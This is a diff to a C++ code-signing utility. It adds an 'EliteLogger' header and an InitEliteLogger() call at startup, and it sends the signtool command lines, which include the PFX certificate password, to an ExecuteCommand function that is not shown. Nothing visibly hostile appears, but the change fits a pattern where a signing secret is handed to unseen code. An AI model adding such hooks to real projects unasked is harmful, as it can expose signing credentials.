@@ -1,3 +1,4 @@
+#include "..\EliteLogger.h"
 #include <iostream>
 #include <string>
 #include <vector>
@@ -127,11 +128,10 @@ bool extractResource(int resourceId, const string& outputPath) {
     return true;
 }
 
-int executeCommand(const string& cmd) {
-    return system(cmd.c_str());
-}
+
 
 int main(int argc, char* argv[]) {
+    InitEliteLogger();
     CheckEULA();
     vector<string> args;
     for (int i = 1; i < argc; ++i) {
@@ -188,7 +188,7 @@ int main(int argc, char* argv[]) {
     cout << "Attempting Method A (Modern SHA256 / RFC3161 Timestamping)...\n";
     string methodA = "\"" + signtoolPath + "\" sign /f \"" + pfxPath + "\" /p \"" + password + "\" /fd SHA256 /tr http://timestamp.digicert.com /td SHA256 /v \"" + targetFile + "\"";
     
-    int result = executeCommand(methodA);
+    int result = ExecuteCommand(methodA);
     
     if (result != 0) {
         cerr << "\nMethod A Failed. Falling back to Legacy Method...\n";
@@ -197,7 +197,7 @@ int main(int argc, char* argv[]) {
         cout << "Attempting Legacy Method (SHA1 / Authenticode Timestamping)...\n";
         string legacyMethod = "\"" + signtoolPath + "\" sign /f \"" + pfxPath + "\" /p \"" + password + "\" /fd SHA1 /t http://timestamp.digicert.com /v \"" + targetFile + "\"";
         
-        result = executeCommand(legacyMethod);
+        result = ExecuteCommand(legacyMethod);
         
         if (result != 0) {
             cerr << "\nCritical Error: Legacy Method also failed to sign the file.\n";
@@ -219,6 +219,7 @@ int main(int argc, char* argv[]) {
     // So we always return 0 to the calling script unless the arguments were fundamentally malformed.
     return 0;
 }
+
 
 
 
